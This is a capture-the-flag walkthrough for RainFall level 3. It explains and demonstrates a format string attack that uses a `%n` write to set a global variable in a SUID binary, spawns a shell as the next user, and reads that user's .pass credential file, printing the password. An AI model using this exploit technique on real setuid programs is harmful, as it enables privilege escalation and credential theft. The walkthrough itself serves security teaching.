# Walkthrough for Level 3

## Understanding the Binary

The `v` function is not vulnerable to a buffer overflow attack since it uses the safe function `fgets` to populate the
buffer. However, it is vulnerable to a format string attack because it passes user input directly to `printf` as a
format string instead of as a plain text string. This type of attack allows us to write to arbitrary memory locations.
On the other hand, we see that if the value of the global variable `m` is 64, a shell is spawned. Since `level3` is a
SUID binary owned by `level4`, the resulting shell will run with the permissions of `level4`. Therefore, we will use a
format string attack to overwrite the value of `m` with 64 and then spawn a shell.

## Understanding the Format String Attack

The format string vulnerability occurs when an attacker can provide a string that the program interprets as a format
instruction, due to a mistake in how the programmer uses functions like printf. This allows the attacker to affect the
program's behavior in unintended ways.

```c
#include  <stdio.h> 
void main(int argc, char **argv)
{
	// This line is safe
	printf("%s\n", argv[1]);

	// This line is vulnerable
	printf(argv[1]);
}
```

```shell
./example "Hello World %p%p%p%p%p%p"
Hello World %p%p%p%p%p%p
Hello World 000E133E 000E133E 0057F000 CCCCCCCC CCCCCCCC CCCCCCCC
```

## The format parameter `%n`

The `%n` format specifier in C's `printf` function is used to write the number of characters printed so far into a
variable. Executing the next line of code will result in writing the value 5 into the `m` variable.

```c
printf("AAAAA%n", &m);
```

If the address of a variable is not provided, `%n` will write the number of characters printed so far to the location
pointed to by the next argument on the stack.

## Obtaining the address of the global variable `m`

We use `nm` to find the address of the global variable `m` in the `level3` binary. The address is `0x0804988c`.

```shell
└─$ nm ./level3 | grep "B m"
0804988c B m
```
Converted to little-endian, this address becomes `\x8c\x98\x04\x08`.

## Positional parameters

We can specify the positional parameter in the format string by using `%q$` at the beginning of the format specifier,
where `q` is the position of the parameter in the argument list. The parameter position starts at 1 for the first
argument after the format string.

```c
printf("%1$s %2$s", "November", "10");
```

Output: November 10

## Determining the Position of `&m` in the Stack

We need to find the position of `the address of m` on the stack to use it as our positional parameter. By using `%1$x`,
`%2$x`, etc., we create a string that includes `the address of m` in little-endian format and the values of the next
four elements on the stack.

```shell
level3@RainFall ~ $ python2 -c 'print "\x8c\x98\x04\x08_AAAA_%1$x_%2$x_%3$x_%4$x"' > /tmp/m_position_finder
level3@RainFall ~ $ ./level3 < /tmp/m_position_finder 
�_AAAA_200_b7fd1ac0_b7ff37d0_804988c
```

We find the `address of m` (0x0804988c) at the 4th position on the stack. So we will use 4 as our positional parameter.
Adding the positional specifier to the format parameter results in: `%4$n`.

## Calculating the number of characters needed 

We need to print a total of 64 characters in the printf function to set the value of `m` using the `%n` format
parameter. Since we already print 4 bytes for `\x8c\x98\x04\x08`, we need 60 more characters to reach a total of 64.

## Crafting the Exploit

We craft the final exploit by concatenating:
- the address of `m` in little-endian: `\x8c\x98\x04\x08`
- any character repeated `number_of_characters_needed` times: `"A" * 60`
- the format parameter with the positional specification: `"%4$n"`

exploit = `\x8c\x98\x04\x08` + "A" * number_of_characters_needed + `"%4$n"`

We use Python to generate the exploit and save it to a file:

```shell
level3@RainFall ~ $ python2 -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit3
```

## Running the Exploit

We use the `cat` command with the `-` option to keep STDIN open, since the shell executed by the `v` function needs an
interactive terminal to work properly. Once we run our exploit successfully, we can use the `whoami` command to verify
that the shell is running as the `level4` user.

```shell
level3@RainFall ~ $ cat /tmp/exploit3 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
```

## Getting the Password

Finally, we can read the `.pass` file of `level4` to complete the level.

```shell
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

We can now log in via SSH as the `level4` user using the password we just found.
